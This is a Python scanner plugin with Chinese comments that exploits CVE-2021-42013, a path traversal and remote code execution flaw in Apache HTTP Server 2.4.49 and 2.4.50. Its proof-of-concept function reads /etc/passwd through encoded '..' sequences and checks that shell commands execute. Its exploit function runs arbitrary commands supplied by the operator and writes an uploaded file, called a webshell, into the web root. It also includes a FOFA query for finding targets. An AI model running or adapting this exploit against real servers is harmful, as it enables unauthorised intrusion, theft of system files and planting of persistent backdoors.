#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests,base64
from urllib.parse import urlparse
vuln_url = []
def vuln_info():
    info={
        'vuln_name': 'CVE-2021-42013',  #漏洞名称
        'vuln_referer':'https://mp.weixin.qq.com/s/mTLYkavkf13g4XosFLBjkg',  #漏洞来源
        'vuln_author':'qianxiao996',  #插件作者
        'cms_name':'Apache',#cms_name需要和上级目录保持一致。扫描器自动添加会调用。GUI版本不会调用
        'vuln_description':'''Apache HTTP Server 2.4.50 中对 CVE-2021-41773 的修复不够充分。攻击者可以使用路径遍历攻击将 URL 映射到由类似别名的指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置 “要求全部拒绝” 的保护，则这些请求可能会成功。如果还为这些别名路径启用了 CGI 脚本，则可以允许远程代码执行。
          此问题仅影响 Apache 2.4.49 和 Apache 2.4.50，而不影响更早版本。''',
        'vuln_identifier':'''CVE-2021-42013''',
        'vuln_class':'远程代码执行',#如：信息泄漏、远程命令执行、任意文件上传、SQL注入、XML注入、任意文件读取、本地文件包含、认证绕过/未认证、弱口令、目录遍历、其他、反序列化漏洞、OGNL表达式注入、SSRF、后门、任意文件下载、鉴权绕过、暴力破解、命令注入、路径泄露、XSS、远程文件包含、CSRF、任意文件包含、代码注入、任意文件写入、密码硬编码、文件包含、任意用户注册、缓冲区溢出、用户枚举漏洞、任意文件删除、任意页面上传、管理权限等
        'vuln_solution':'''升级新版本''',
        'FofaQuery_type':'http', #socket、http
        'FofaQuery_link':'/', #此处的路径会加在url拼接访问，进行FofaQuery的条件匹配 此处为all为全部页面都检测
        'FofaQuery_rule':'header="Apache/2.4.49"||header="Apache/2.4.50"',#header="JSESSIONID" || body="Struts Problem Report" || body="There is no Action mapped for namespace" || body="No result defined for action and result input" || header="Servlet" || header="JBoss",port="60001"
        #header', 'body', 'title', 'banner','port','banner','service','protocol','server'
        'ispoc':1, #是否有poc  1为有 0为无
        'isexp':1  #是否有exp   1为有 0为无
    }
    return info

# url：url  hostname：主机地址  port：端口  scheme：服务  heads：http自定义头信息
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    # 返回参数
    #Result返回是否存在，
    #Result_Info为返回的信息，可以为Paylaod 
    #Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
    #Error_Info无论何时都会输出
    try:
        result = {"Result":False,"Result_Info":""}
        url_target =url+"/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
        url_target=url_target.replace("://",":::").replace("//","/").replace(":::","://")
        s = requests.Session()
        # print(url_target)
        req = requests.Request(method='GET' , url=url_target)
        prep = req.prepare()
        prep.url = url_target
        r = s.send(prep, verify=False)
        # detect by root on /etc/passwd 
        if "root:x:" in r.text:
            result['Result']= True
            result['Result_Info']= '|'.join(vuln_url)
            return result
            # print("[*] Vuln -> "+target)
        else:
            url_target =url+"/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
            url_target=url_target.replace("://",":::").replace("//","/").replace(":::","://")
            s = requests.Session()
            data='echo;echo 9304c2d1af7a21f56830c7ba773a93e2 | base64'
            req = requests.Request(method='GET' , url=url_target,data=data)
            prep = req.prepare()
            prep.url = url_target
            r = s.send(prep, verify=False)
            if "OTMwNGMyZDFhZjdhMjFmNTY4MzBjN2JhNzczYTkzZTIK" in r.text:
                result['Result']= True
                result['Result_Info']= url_target
                return result
            else:
                result['Result_Info']= '不存在'
        return result
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')

    
# url:url   hostname：主机地址  port：端口  scheme：服务  heads:自定义请求头 
    # 返回参数
    #Result返回是否成功，
    #Result_Info为返回的信息，可以为Paylaod 
    #Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
    #Error_Info无论何时都会输出
def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    try:
        # print(exp_data['type'])
        result = {"Result":False,"Result_Info":"不存在"}
        url_target =url+"/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
        url_target=url_target.replace("://",":::").replace("//","/").replace(":::","://")
        s = requests.Session()
        #命令执行

        if exp_data['type']=='cmd':
            data='echo;'+exp_data['command']
            req = requests.Request(method='GET' , url=url_target,data=data)
            prep = req.prepare()
            prep.url = url_target
            r = s.send(prep, verify=False)
            if r.status_code==200:
                result['Result']= True
                result['Result_Info']= r.text
                return result
            else:
                result['Result_Info']= '执行失败'  
                result['Result']= True
        #反弹shell    
        if exp_data['type']=='shell':
            result['Result']= True
            result['Result_Info']= "暂不支持反弹shell"
                
        #上传文件    
        if exp_data['type']=='uploadfile':
            base64_file_data =base64.b64encode(exp_data['filename_contents'].encode()).decode()
            # file_data = urllib.parse.quote(base64_file_data)
            data='echo;echo '+base64_file_data+'| base64 -d > /var/www/html/'+exp_data['filename']
            # print(data)
            req = requests.Request(method='GET' , url=url_target,data=data)
            prep = req.prepare()
            prep.url = url_target
            r = s.send(prep, verify=False)
            if r.status_code==200:
                webshell_url = url+exp_data['filename']
                print(webshell_url)
                dd =requests.get(webshell_url,timeout=5)
                if dd.status_code==200:
                    result['Result']= True
                    result['Result_Info']= '上传成功,文件路径:'+webshell_url
                    return result
                else:
                    result['Result']= True
                    result['Result_Info']= '上传失败！'
                    return result

            else:
                result['Result']= True
                result['Debug_Info'] = '返回状态码:'+str(r.status_code)
        return result
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')